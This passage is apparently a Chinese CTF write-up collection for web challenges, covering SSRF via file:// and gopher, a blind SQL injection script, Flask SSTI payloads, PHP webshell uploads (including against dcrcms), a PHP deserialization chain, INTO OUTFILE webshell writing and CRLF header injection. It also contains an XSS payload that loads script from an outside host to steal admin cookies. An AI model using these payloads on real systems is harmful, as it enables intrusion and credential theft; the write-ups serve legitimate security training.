?file=p%2568p%253a%252f%252ff%2569lter%252fstring.rot13%252fresource=%252ffl%2561g
```
执行完后会回显一个rot13编码的字符串，可以找一个在线网站直接解码或者随波逐流一把梭，就能拿到flag！！！
# 14.MyGO!!!
#### 摘要：
先查看页面源码找到接口index.php?proxy=和data-url="http://localhost/???" 再扫描目录得到flag.php看到源码，最后使用file://来读取根目录下的flag
#### 解：
![](/images/20260511172038.png)
就给了这样一个界面，点击也只会播放音乐，页面没有任何其他的反应，还是老样子，查看页面源码
```java
`<script>` 
const player = document.getElementById('player'); document.querySelectorAll('.ghost-btn').forEach(btn => { btn.addEventListener('click', () => { 
	const url = btn.getAttribute('data-url'); 
// 通过 PHP 代理播放 
player.src = `index.php?proxy=${encodeURIComponent(url)}`; player.play(); //ssrf漏洞
	}); 
});
`</script>`
```
这里是说，点击播放后会把地址改成了同网站的`index.php`文件，同时把原始地址作为参数`proxy=`传递过去。并且还有这样一句话
```html
<button class="ghost-btn" data-url="http://localhost/???">flag</button> 
```
按钮点击后，会请求：  
`index.php?proxy=http://localhost/???`  
意思是让服务器去请求 `http://localhost/???`，并把结果返回给播放器。
然后使用dirsearch扫出来了这些
```
[17:18:26] 403 -    38B - /flag.php
[17:18:27] 200 -    3KB - /index.php
[17:18:27] 200 -    3KB - /index.php/login/
[17:18:29] 403 -   286B - /server-status
[17:18:29] 403 -   286B - /server-status/
```
403-不能直接通过浏览器打开，所以我们可以通过index.php 的代理功能来读取
```
index.php?proxy=http://localhost/flag.php
```
然后就能读取flag.php源码了
```php
<?php   
$client_ip = $_SERVER['REMOTE_ADDR'];  
if ($client_ip !== '127.0.0.1' && $client_ip !== '::1') {    
	header('HTTP/1.1 403 Forbidden');       
	echo "你是外地人，我只要\"本地\"人";       
	exit;   }      
highlight_file(__FILE__);  
if (isset($_GET['soyorin'])) {    
	$url = $_GET['soyorin'];          
	echo "flag在根目录";       
	$ch = curl_init($url);    
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);    
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);    
	curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);    
	curl_exec($ch);    
	curl_close($ch);       
	exit;   
	}      
?>
```
##### 漏洞利用点：
(1):ip限制，只允许本地IP（127.0.0.1和::1）访问；
(2):存在SSRF参数,`soyorin`可以发起任意cURL请求
(3):cURL配置，结果直接输出到浏览器
所以我们可以使用file://来读取本地文件，而且他也说了flag在根目录，最后可以构造出
```
/index.php?proxy=http://localhost/flag.php?soyorin=file:///flag
```
就拿到flag！！！

# 15.白帽小 K 的故事（2）
#### 摘要：
根据他的提示就能发现是盲注，但是空格被过滤了，后面就用脚本跑一跑
#### 解：
走完故事线就进入他的简易的备用终端，查看提示告诉你是盲注（最讨厌盲注了），
先试一下规律。`amiya' or 1=1#`，检测到了非法字符，经过测试过滤了空格，可以用括号进行绕过。

```bash
amiya'&&1=1#
amiya'&&1=0#
```
于是就借用了一下大佬的脚本来跑啊
```python
import requests  
import string  
import time  
  
url = "http://docker.qingcen.net:49202/search"  
strings = string.digits+string.ascii_letters+"{}_-"  
result = ""  
  
# 获取数据库长度  
# for j in range(100):  
#     payload = {"name": f"amiya'&&if(length(database())={j},1,0)#"}  
#     resp = requests.post(url, data=payload)  
#     if b"ok" in resp.content:  
#         print(j)    # 5  
#         break  
  
# 获取所有数据库名称  
# for j in range(1, 80):  
#     for k in strings:  
#         payload = {"name": f"amiya'&&if(substr((select(group_concat(schema_name))from(information_schema.schemata)),{j},1)='{k}',1,0)#"}  
#         resp = requests.post(url, data=payload)  
#         if b"ok" in resp.content:  
#             result += k  
#             break  
#         time.sleep(0.3)  
#     print(result)   # mysqlinformation_schemaperformance_schemasysTerraFlag  
  
# 获取Flag数据库中的数据表名  
# for j in range(1, 80):  
#     for k in strings:  
#         payload = {"name": f"amiya'&&if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='Flag')),{j},1)='{k}',1,0)#"}  
#         resp = requests.post(url, data=payload)  
#         if b"ok" in resp.content:  
#             result += k  
#             break  
#         time.sleep(0.3)  
#     print(result)   # flag  
  
# 获取flag表中的字段名  
# for j in range(1, 80):  
#     for k in strings:  
#         payload = {"name": f"amiya'&&if(substr((select(group_concat(column_name))from(information_schema.columns)where((table_schema='Flag')and(table_name='flag'))),{j},1)='{k}',1,0)#"}  
#         resp = requests.post(url, data=payload)  
#         if b"ok" in resp.content:  
#             result += k  
#             break  
#         time.sleep(0.3)  
#     print(result)   # flag  
  
# 获取flag表中flag字段的值  
for j in range(1, 80):  
    for k in strings:  
        payload = {"name": f"amiya'&&if(substr((select(group_concat(flag))from(Flag.flag)),{j},1)='{k}',1,0)#"}  
        resp = requests.post(url, data=payload)  
        if b"ok" in resp.content:  
            result += k  
            break  
        time.sleep(0.3)  
    print(result)   # flag{c8da8fe1-1344-c4f3-ad4a-837f4514edd3}
```
至于后面为什么有一个/search，其实页面源码里面有一句这样的话
```
try { // 发送 POST 请求到 /search 接口 const response = await fetch('/search', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', }, body: `name=${encodeURIComponent(query)}` });
```
就能拿到flag！！！
# 16.mirror_gate

#### 摘要：
有时候找不到思路的时候就可以查看网页源码，比如这里的flag is in flag.php、HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== 、dirsearch都是重要信息，扫描出的.htaccess文件给了.webp可以让文件以php代码执行，还有一般的一句话木马也被过滤了，可以使用短标签和反引号执行命令
#### 解：

##### 1.1 分析首页源代码
访问目标网站，查看页面源代码发现关键线索：
```text
<!-- flag is in flag.php -->

<!-- HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== -->
```
**解码提示**：
```text
echo "c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw==" | base64 -d

# 输出: something_is_in_/uploads/
```
这明确提示我们关注 `/uploads/` 目录。
##### 1.2 分析上传表单
找到上传处理端点：
```text
<form action="upload.php" method="post" enctype="multipart/form-data" class="upload-form">
```
##### 1.3 检查上传结果页面
访问 `upload.php`，在页面底部发现：
```text
<!--dirsearch-->
```
这提示我们可以使用目录扫描工具。
**输入点**:
- 文件上传表单 (`upload.php`)
- 上传文件内容可控
##### 2.1 发现关键配置文件
扫描发现：
```text
/uploads/.htaccess
```
访问该文件内容：
```text
AddType application/x-httpd-php .webp
```
##### 3.1 .htaccess 配置分析
```text
AddType application/x-httpd-php .webp
```
**配置含义**：
- `AddType`：Apache 指令，用于添加 MIME 类型映射
- `application/x-httpd-php`：PHP 解释器的 MIME 类型
- `.webp`：WebP 图片格式文件扩展名
简单说上传的图片以.webp会被当做php代码执行
##### 3.2 漏洞利用条件
1. 服务器允许上传 `.webp` 文件（在白名单内）
2. `.htaccess` 配置错误，将 `.webp` 当作 PHP 执行
3. 上传目录有执行 PHP 的权限
#####  4.1 初始尝试失败
最初尝试上传包含完整 PHP 标签的 WebP 文件：
```text
<?php system("cat /flag.php"); ?>
```
但服务器返回”文件内容存在安全风险”。
##### 4.2 发现过滤规则
经过测试发现：
1. **完整 PHP 标签被过滤**：`<?php ... ?>` 被检测到
2. **短标签可用**：`<? ... ?>` 可以绕过检测
3. **反引号执行命令**：`` `command` `` 可以执行系统命令
4. **include 函数可用**：`include "/flag.php"` 可以包含文件
##### 5.1 创建恶意 WebP 文件
```text
<? include "/flag.php"; ?>
```
##### 5.2 上传文件
通过网页表单上传 `muma.webp`，服务器返回：
```text
恭喜！文件上传成功。

文件: exploit.webp

文件已通过安全扫描，可放心使用。
```
##### 5.3 执行恶意代码
点击查看就能看到flag！！！
# 17.who'ssti
#### 摘要：
在一次请求中调用所有目标函数，触发flag返回条件
#### 解：
下载完后里面有个app.py代码
```python
from flask import Flask, jsonify, request, render_template_string, render_template  
import sys, random  
  
func_List = ["get_close_matches", "dedent", "fmean",   
             "listdir", "search", "randint", "load", "sum",   
             "findall", "mean", "choice"]  
need_List = random.sample(func_List, 5)  
need_List = dict.fromkeys(need_List, 0)  
BoleanFlag = False  
RealFlag = __import__("os").environ.get("ICQ_FLAG", "flag{test_flag}")  
# 清除 ICQ_FLAG__import__("os").environ["ICQ_FLAG"] = ""  
  
def trace_calls(frame, event, arg):  
  if event == 'call':  
    func_name = frame.f_code.co_name  
    # print(func_name)  
    if func_name in need_List:  
      need_List[func_name] = 1  
    if all(need_List.values()):  
      global BoleanFlag  
      BoleanFlag = True  
  return trace_calls  
  
  
app = Flask(__name__)  
@app.route('/', methods=["GET", "POST"])  
def index():  
  submit = request.form.get('submit')  
  if submit:  
    sys.settrace(trace_calls)  
    print(render_template_string(submit))  
    sys.settrace(None)  
    if BoleanFlag:  
      return jsonify({"flag": RealFlag})  
    return jsonify({"status": "OK"})
```
意思是在一次请求中调用所有目标函数，触发flag返回条件，这里借用了大佬的脚本来触发5个指定函数的调用使`BoleanFlag=True`获得flag。
```python
import requests
import re

url = "http://docker.qingcen.net:49538/"

# 构造SSTI payload，一次请求调用所有5个目标函数
payload = (
    "{{lipsum.__globals__['__builtins__']['__import__']('statistics').fmean([1,2,3])}}"
    "{{lipsum.__globals__['__builtins__']['__import__']('random').randint(1,100)}}"
    "{{lipsum.__globals__['__builtins__']['__import__']('re').search('test','testtest')}}"
    "{{lipsum.__globals__['__builtins__']['__import__']('re').findall('test','testtest')}}"
    "{{lipsum.__globals__['__builtins__']['__import__']('random').choice(['a','b'])}}"
)

print(f"Payload: {payload}")
print(f"Payload长度: {len(payload)}")

# 提交payload
resp = requests.post(url, data={'submit': payload})

print(f"\n状态码: {resp.status_code}")
print(f"响应内容:\n{resp.text}")

# 提取flag
if 'flag' in resp.text.lower():
    try:
        data = resp.json()
        print(f"\n[+] JSON数据: {data}")
        if 'flag' in data:
            print(f"\n[+] 获取到flag: {data['flag']}")
    except:
        match = re.search(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
        if match:
            print(f"\n[+] 获取到flag: {match.group(0)}")
        else:
            match2 = re.search(r'flag\S+', resp.text, re.IGNORECASE)
            if match2:
                print(f"\n[+] 可能的flag: {match2.group(0)}")
```
或者提交以下payload
```
{{config}}
{{ config.__class__.__init__.__globals__.__builtins__.__import__('random').randint(1, 100) }}
{{ config.__class__.__init__.__globals__.__builtins__.__import__('textwrap').dedent('  test\n  ') }}
{{ config.__class__.__init__.__globals__.__builtins__.__import__('difflib').get_close_matches('test', ['test', 'testing']) }}
{{ config.__class__.__init__.__globals__.__builtins__.__import__('statistics').fmean([1, 2, 3, 4, 5]) }}
{{ config.__class__.__init__.__globals__['__builtins__'].__import__('random').choice(['a','b','c']) }}
{{ config.__class__.__init__.__globals__['__builtins__'].__import__('statistics').mean([1,2,3,4,5]) }}
{{ lipsum.__globals__.os.listdir('.') }}
{{ config.__class__.__init__.__globals__['__builtins__'].__import__('re').search('test', 'test string') }}
{{ config.__class__.__init__.__globals__['__builtins__'].__import__('re').findall('t', 'test') }}
{{ config.__class__.__init__.__globals__['__builtins__'].__import__('pickle').loads.__name__ }}
{{ config.__class__.__init__.__globals__['__builtins__'].__import__('numpy').sum([1,2,3,4,5]) }}
```
就拿到flag！！！
# 18.SSTI 在哪里？
#### 摘要：

#### 解：
先对附件代码审计  
在 internal_web.py中发现ssti漏洞：

![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/20604409-c0ef-439a-8ac8-1bbf971131b4.webp "image.png")  
并且可以得知该漏洞是在python内部服务里，应该需要利用ssrf打入  
接着在app.py发现监听了所有网卡

![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/11825d01-e261-47b2-9a33-32cb340c231a.webp "image.png")但是从 docker-compose.yaml发现外部玩家只允许访问80端口(index.php)

![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/174ff2df-b568-425c-841d-1b0728842eaa.webp "image.png")  
在dockerfile中可以发现，flag在环境变量里

![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/9a9aa43b-47ee-4781-92ec-971e38b86307.webp "image.png")  
那么我们看看index.php，有没有什么跳板帮助我们进行ssrf

![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/e18d4487-b44f-4b09-b266-0f718bb028c1.webp "image.png")  
发现存在ssrf  
这个PHP页面接收一个url参数，然后使用curl去访问这个 URL，并把访问结果返回给你  
那么我们可以利用这个漏洞点去请求本地的python服务(如5000端口或5001端口)

那么我们审计完源码后，可以明确攻击思路：  
1.访问题目给的靶机地址(index.php)，利用该页面的curl进行ssrf  
2.访问127.0.0.1:5001,并且想办法在请求中带上你的SSTIpayload  
3. Python服务触发 SSTI 漏洞，并将结果原路返回给PHP，然后执行结果显示在页面上

但是我们清楚curl默认是发送get请求，然而存在漏洞点的5001内部端口和监听端口5000，获取数据用的是request.from.get(),这意味着它们只接收post表单数据

那么我们需要用gopher协议伪造HTTP 请求，传入data，payload如下 
```
gopher://127.0.0.1:5001/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A5001%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AConnection%3A%20close%0D%0AContent-Length%3A%2016%0D%0A%0D%0Atemplate%3D%7B%7B7%2A7%7D%7D
```
![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/4859549e-e76f-4d8e-803e-65fdaa62965b.webp "image.png")  
然而网页并没有回显49，没有反应  
是gopher协议被禁用了吗？我们来验证一下，输入  
`gopher://127.0.0.1:80` （apache服务器自己（80端口），看看它认不认识gopher）  
发现还是和前面一样没有响应，但是有一个关键点，这次是网页加载了大概10秒，然后没有返回  
由此可以看出，如果说gopher被禁用了，那么页面会立即无响应，然而页面先加载了10秒，是因为Gopher成功连上了80端口，但是可能我们发过去的报文不够规范，Apache服务器以为我们话还没说完，就在那里傻等，直到10秒后触发curl超时强行挂断。  
因此gopher协议是活的，可是为什么连接不上5001？

想了好久也没想通，转换思路，试试file协议可不可用,输入 
`file:///etc/passwd`

![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/b01eaf63-163b-4704-adc6-0ec882d3456b.webp "image.png")  
发现file没有被禁用  
前面审计的时候得知flag在环境变量里，那么直接用file查找，输入  
`file:///proc/1/environ 或 file:///proc/self/environ`  
然而没有响应，可能是www-data权限太低或者别的原因  
然后试试查看服务器当前所有正在监听的端口，输入  
`file:///proc/net/tcp`


![image.png|96](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/85c64c73-033d-48e3-873c-e6562964a732.webp "image.png")  
终于有反应了，把他们都转化成十进制，结果发现了出题人的恶毒之处  
转化之后可以发现，存在80和5000端口，但是根本没有5001端口！！！这也就是为什么gopher是活的，但是就是前面访问5001没响应的原因，服务器上根本就没有 5001 端口  
并且发现0100007F:EA78转化完后是127.0.0.1: 60024  
多出来一个60024端口！这会不会就是原本5001端口的服务？  
做到这里才反应过来：  
出题人给你的附件源码，和服务器上真正跑的代码，是不一样的 !（该死的出题人啊）  
那么接下来我们只需要用file协议，将真正的源码找出来，便可以解题了，输入  
`file:///app/app.py`

![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/bcce3c47-26e8-4f42-ae78-75e288012b2e.webp "image.png")
`file:///app/start.sh`
![image.png](https://oss1.qingcen.net/ctf-attachments/image/2026/05/10/bb0f7045-bd1d-4442-bf5e-89362ba3cb2f.webp "image.png")

从真实的源码可以得知：  
1.附件里的app.py是假的。它根本没有用去发标准的HTTP请求， 它实际上是一个原生的TCP代理， 它直接建立底层的TCP连接sock.connect(('127.0.0.1',port_num))  
2.附件里的start.sh也是假的  
rm -f /app/secret.py 那个定义了真实端口port_num的文件，在容器启动的一瞬间就被删除了。他就是不想让你知道真实的内部端口是多少。  
echo "$ICQ_FLAG" > /flag 出题人把环境变量里的flag，写到了系统根目录下的 /flag 文件里
所以说前面凭空多出来的60024端口，就是我们以为存在SSTI漏洞的5001端口
那么这道题目有两种解法  
1.file:///flag  
直接得出flag  
2.gopher协议
```
gopher://127.0.0.1:60024/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A60024%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AConnection%3A%20close%0D%0AContent-Length%3A%2016%0D%0A%0D%0Atemplate%3D%7B%7B7%2A7%7D%7D  
```
回显49，成功执行，接下来我们可以查看环境变量
```
gopher://localhost:60024/_POST%20/%20HTTP/1.1%0D%0AHost%3A%20localhost%3A5001%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2076%0D%0A%0D%0Atemplate%3D%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27env%27%29.read%28%29%7D%7D
```
就拿到flag！！！
#### 知识点：
gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合gopher 协议的请求。
在 gopher 协议中发送HTTP的数据，需要以下三步：
1、构造 HTTP 数据包
2、URL 编码、替换回车换行为 %0d%0a
3、发送 gopher 协议
注意 gopher 协议格式
```url
gopher://ip:port/_后接TCP数据流(就是经过上面1,2步后得到的数据)
```
#  19.武功秘籍
#### 摘要：
题目描述告诉你了是一个cve漏洞——dcrcms（CNVD-2020-27175）一个文件上传漏洞，就按照正常的文件上传步骤来就行
#### 解：
先点击产品中心来到网站后台登录系统（每次开启容器只能出现一次）
查看页面源码发现
```
<!-- 你找到了后台，可是要登录才能进去，怎么办怎么办？--> 
<!-- 欸，管理人员好像有点疏忽了，密码设置的没有很强哦-->
```
直接使用弱口令，账号密码admin/admin，就成功登陆进来了
我们找一下有没有可以上传文件的地方，在
![](/images/20260511202744.png)
经过测试直接传.php是不行的，所以我们可以传一个post_CMD.png
```php
<?php
@eval($_POST['shell']);
?>
```
![](/images/20260511203546.png)
放行就上传成功了，不过我们还要找上传的路径管理系统->文件管理器->uploads->cache->2026_05_11->2605110805493787.php(这就是我们上传的文件，因为后面又上传的日期)点击后，
```
POST:shell=system('ls /');
```
发现了flag
```
POST:shell=system('cat /flag');
```
就拿到了flag！！！（其实直接查看环境变量能直接拿到flag：shell=system('env');）
# 20.小 E 的留言板
#### 摘要：
#### 解：
先注册一个账号：admin/123
这里有个留言板，一般这种题目就是考察xss的，先使用常用的payload来试一下
```
`<script>`alert(1)`</script>`
```
结果页面回显
```
alert(1)/
```
很明显`<`、`>`、`script`被过滤了，我们继续测试其他的payload，经过测试发现`on`、`focus` 、`空格`都被过滤了，被包裹的语句是这样的`value="alert(1)/"`所以我们可以使用`"`来闭合，然后再用空格,让解析器意识到空格后面输入的“autofocus......”不再是value值，而是另外一个input属性了；
之前过滤的关键字可以尝试使用双写绕过（其他的绕过方法都试了），最终构造出的payload为
```
" autofofocuscus oonnfofocuscus="var s=document.createElement('scrscriptipt');s.src='https://ujs.cx/nyY';document.head.appendChild(s)
```
这里需要注册xss平台地址用于接收cookie值，我使用的是`https://xssjs.com`
更新留言后，我们需要点击报告留言，这样小E才回去查看你的留言，才能看到管理员的cookies，在TLXSS平台要多刷新几次，直到看到`http://localhost:5000/user/123`才能真正的拿到管理员的cookies，就拿到flag！！！
# 21.小羊走迷宫
#### 摘要：
这是一道PHP反序列化漏洞利用题。题目定义了4个类，它们通过各自的**魔术方法**相互调用，形成一条调用链。攻击者需要构造特定的序列化数据，传递给`unserialize()`函数，触发这条调用链，最终让程序执行`file_get_contents("flag.php")`来读取flag文件。
#### 代码审计：
##### 1.startPoint
```php
class startPoint{
    public $direction;
    function __wakeup(){
        echo "gogogo出发咯 ";
        $way = $this->direction;
        return $way();   // 把direction当作函数调用
    }
}
```
`__ wakeup()`:反序列化时自动执行
这个函数会调用`$this->direction()`，如果`direction`是一个对象，就触发该对象的`__invoke()`魔术方法
##### 2.SaySomething
```php
class SaySomething{
    public $sth;
    function __invoke(){
        echo "说点什么呢 ";
        return "说： ".$this->sth;
    }
}
```
`__invoke()`：当对象被当作函数调用时触发（如`$obj()`）
这里返回一个字符串，如果`$sth`是一个对象，返回时会隐式转为字符串 → 触发`__toString()`
##### 3.Treasure
```php
class Treasure{
    protected $door;
    protected $chest;
    function __get($arg){
        echo "拿到钥匙咯，开门！ ";
        $this->door->open();  // 调用不存在的open()方法
    }
    function __toString(){
        echo "小羊真可爱! ";
        return $this->chest->key;  // 访问不存在的key属性
    }
}
```
`__toString()`：对象被当作字符串时触发，返回`$this->chest->key`
如果`$chest`是对象，访问不存在的`key`属性 → 触发`__get()`
`__get()`：访问不可访问属性时触发，内部调用`$this->door->open()`
如果`$door`是对象，调用不存在的`open()`方法 → 触发`__call()`
##### 4.endPoint
```php
class endPoint{
    private $path;
    function __call($arg1,$arg2){
        echo "到达终点！现在尝试获取flag吧<br>";
        echo file_get_contents($this->path);  // 读文件！
    }
}
```
`__call()`：调用不存在的方法时触发
执行`file_get_contents($this->path)` → 只要控制`$path`就能读取任意文件
我们要让`$path = "flag.php"`或`"php://filter/read=convert.base64-encode/resource=flag.php"`
#### 解：
问一下AI 调用链：
startPoint类的__wakeup方法
```
startPoint类的__wakeup方法
    --SaySomething类的__invoke方法
        --Treasure类的__toString方法
            --Treasure类的__get方法
                --endPoint类的__call方法
                    --flag
```
接下来就可以构造payload的
###### 第1步：创建endPoint对象
```php
$e = new endPoint();
$e->path = "php://filter/read=convert.base64-encode/resource=flag.php";
```
注意：`$path`是`private`属性，序列化时格式为`\x00endPoint\x00path`
###### 第2步：创建Treasure对象B（door指向endPoint）
```php
$tB = new Treasure();
$tB->door = $e;   // protected属性，格式 \x00*\x00door
```
###### 第3步：创建Treasure对象A（chest指向对象B）
```php
$tA = new Treasure();
$tA->chest = $tB; // protected属性
```
###### 第4步：创建SaySomething对象（sth指向对象A）
```php
$s = new SaySomething();
$s->sth = $tA;    // public属性，直接写
```
###### 第5步：创建startPoint对象（direction指向SaySomething）
```php
$start = new startPoint();
$start->direction = $s;  // public属性
```
###### 第6步：序列化并base64编码
```php
$payload = serialize($start);
echo base64_encode($payload);
```
##### 完整生成脚本：
```php
<?php
class startPoint{
    public $direction;
}
class Treasure{
    protected $door;
    protected $chest;
}
class SaySomething{
    public $sth;
}
class endPoint{
    private $path;
}
$e = new endPoint();
$e->path = "php://filter/read=convert.base64-encode/resource=flag.php";
$tB = new Treasure();
$tB->door = $e;
$tA = new Treasure();
$tA->chest = $tB;
$s = new SaySomething();
$s->sth = $tA;
$start = new startPoint();
$start->direction = $s;
echo base64_encode(serialize($start));
?>
```
运行后就得到了
```http
TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NzoiACoAZG9vciI7Tzo4OiJlbmRQb2ludCI6MTp7czoxNDoiAGVuZFBvaW50AHBhdGgiO3M6NTc6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1mbGFnLnBocCI7fXM6ODoiACoAY2hlc3QiO3I6Mzt9fX0=
```
不过还有一个需要注意的点是变量名，PHP 的变量名不能包含小数点 .，因为小数点在 PHP 中是无效的变量名字符。为了处理这种情况，PHP 在解析请求参数时会自动将参数名中的 . 替换为 `_`。  
但是，如果已经前面有一个中括号 `[` 转变为下划线 `_` 了，下一个小数点就不会转变了
所以需要传入`ma[ze.path`,即
```
/?ma[ze.path=TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NzoiACoAZG9vciI7Tzo4OiJlbmRQb2ludCI6MTp7czoxNDoiAGVuZFBvaW50AHBhdGgiO3M6NTc6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1mbGFnLnBocCI7fXM6ODoiACoAY2hlc3QiO3I6Mzt9fX0=
```
就能拿到一串base64编码，解码后就能拿到flag！！！
# 22.sqlupload
#### 摘要：
整个攻击链路为：上传一句话木马文件名 -> 利用 ORDER BY 注入 +
INTO OUTFILE 写入 PHP 文件 -> 执行系统命令获取 Flag。
#### 解：
首先看题目标题就大致能看出来是一个文件上传的题目，先上传一个.php文件看看，不过好像一点用没有。这时候就可以考虑一下sql是什么意思？？？
我们可以看一下附件里的getFileContent.php，里面有这样一段代码
```php
$mysqli->set_charset('utf8mb4');  
$order = $_GET['order'] ?? "upload_time";  
if (!preg_match("/upload_time|id/", $order)) {  
    json_error("非法的 order 参数", 400);  
}  
$sql = "SELECT id, filename, upload_time  
        FROM uploads        ORDER BY $order";  
$result = $mysqli->query($sql);
```
这段代码存在两个关键问题：第一，preg_match 正则检查只要求 order 参数中包含upload_time 或 id 子串即可通过，而非严格匹配完整值；第二，$order 变量被直接拼接进SQL 语句，没有任何参数化处理，导致 SQL 注入漏洞。
除此之外，在start.sh 中特意将 MySQL 的 secure_file_priv 配置为空字符串，这意味着MySQL 允许将查询结果导出到任意目录的文件中。SQL 语句，没有任何参数化处理，导致 SQL 注入漏洞，也明确指向了INTO OUTFILE 写文件的攻击路径。
接下来就我们就可以要向数据库中插入一条 filename 为 PHP 一句话木马的记录，用大白话说就是上传一个文件名字为一句话木马的文件，内容无所谓，因为文件名字会被插入数据库中
```php
"SELECT id, filename, upload_time  
        FROM uploads        ORDER BY $order"
```
![](/images/20260513221042.png)
接下来，利用 getFileList.php 的 order 参数进行 SQL 注入，将数据库中的一句话木马入到 Web 目录下的 PHP 文件中
```
/getFileList.php?order=id%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27
```
服务器会返回
```
success:false
message:"查询异常: Call to a member function fetch_assoc() on bool"
```
这是因为INTO OUTFILE 语句执行后查询不再返回结果集，mysqli->query() 返回了 false。但这并不影响文件的写入，shell.php 已经成功生成在 Web 目录下。我们可以验证一下,访问
```
/shell.php
```
会回显id、filename、upload_time的数据，然后就可以命令执行了
```
POST:1=system('ls -la /');
```
这样可以看到更多信息，我们发现
```
-rw------- 1 root root 43 May 13 14:08 flag drwxr-xr-x
```
这里需要认识linux的一些常见的文件权限的含义
```
-rw-------            所有者（root）可读写，其他人没有任何权限  
```
所以我们不能读取flag，不过值得注意的是，后面有个/readFlag是可读取的
```
POST:1=system('cat /readFlag');
```
不过这样会输出一些乱码的东西，这是因为readFlag是-rwsr-xr-x，而rws里的s是指SETUID，而SETUID的作用是任何用户执行这个程序时，进程的有效用户 ID 会变成文件所有者（root），所以我们只需要
```
POST:1=system('/readFlag');
```
就能拿到flag！！！
# 23.被玩坏的ai
#### 摘要：
扫描目录找到robots.txt发现/find.php,在findpwd.js的提示里需要访问/RPO/findpwd.js就拿到密码了，然后构造crlf攻击就行
#### 解：
他要我们输入当前的账号密码，我们先试一些常见的弱口令看能不能登录进去，貌似不可以（用bp爆破应该也可以，只要字典足够完美，不过那样就感受不到这一题的快乐了），还是老样子，我们来查看一下页面源码，这次好像没有什么收获了，不过我们还可以扫描一下目录，结果发现里/robots.txt,访问之后
```http
User-agent: *
Allow: /find.php
Disallow: /RPO/
```
这里有两个关键信息：一是允许访问/find.php，二是禁止访问/RPO/目录。Disallow通常意味着该目录存在但不想被搜索引擎索引，反而引起了我们的注意。而Allow的/find.php则可能包含有用的提示信息。我们接着访问/find.php，结果是![](/images/20260513225344.png)
令人生气的是，这个yes会随着鼠标的移动而移动，我们可以查看一下页面源码，发现里面有一个findpwd.js，点进去之后只得到一个提示信息："这里可没有，你想要的password，试着找找是不是在其他的find.php中？"这暗示密码隐藏在另一个路径下的findpwd.js中。结合robots.txt中提到的/RPO/目录，我们尝试访问/RPO/findpwd.js，成功获取到密码信息：
```
console.log("Beep boop... 系统消息: yours password:@pwdisadmin");
```
这里涉及到的知识点是RPO（Relative Path Overwrite，相对路径覆盖）攻击。/RPO/目录下的find.php页面使用了相对路径引用findpwd.js，但由于URL路径的不同，浏览器会从/RPO/目录下加载该JS文件，而不是根目录。这就是为什么根目录下的findpwd.js是假的，而真正的密码在/RPO/findpwd.js中。
拿到密码后我们就可以登录了，不过机器人告诉我们不过，要拿到真正的 flag 还需要 Admin 。什么意思呢？其实在最开始的页面源码里有这样一段
```php
/* 在后端有个其他文件进行了下面内容 */
 if (isset($_SERVER['HTTP_X_ADMIN']) && $_SERVER['HTTP_X_ADMIN'] === 'Admin') { $a = getenv("flag"); } else { header('Content-Type: text/plain; charset=utf-8'); $a = "Hello, low-priv user.I'm X,can I help you?"; } 
```
这段注释清楚地表明：后端会检查HTTP请求头中的X-Admin字段，如果其值为Admin，则会
返回flag环境变量的值；否则返回低权限用户的提示信息。因此，我们的目标就是想办法在请求
中注入X-Admin: Admin这个HTTP头。同时，前端JavaScript代码显示，用户输入的消息会通过proxy.php发送，请求体格式为`ua=<msg>&ajax=1`。这里的ua参数名暗示它可能被用作User-Agent请求头，这是CRLF注入的关键入口点。
我们构造CRLF注入的请求。核心思路是在ua参数中注入原始的\r\n字节，使得后端发出的HTTP请求被"截断"，从而伪造X-Admin: Admin请求头。需要注意的是，普通的curl -d参数会对特殊字符进行URL编码，因此我们需要使用--data-binary选项来发送原始字节。同时，还需要添加Referer头来通过来源验证，即
```
printf 'ua=test\r\nX-Admin: Admin&ajax=1' | \
curl -s -X POST 'http://docker.qingcen.net:32979/proxy.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "Referer: http://docker.qingcen.net:32979/proxy.php" \
  -H 'Cookie: PHPSESSID=4e83qrj6bq7ohtd9l7c1lfjlpn' \
  --data-binary @-
```
使用git命令，就拿到flag！！！
#### 什么是CRLF注入：
CRLF注入（Carriage Return Line Feed Injection）是一种Web安全漏洞。HTTP协议使用\r\n
（即CRLF，回车换行）来分隔请求行、请求头和请求体。如果用户输入的数据被直接拼接到
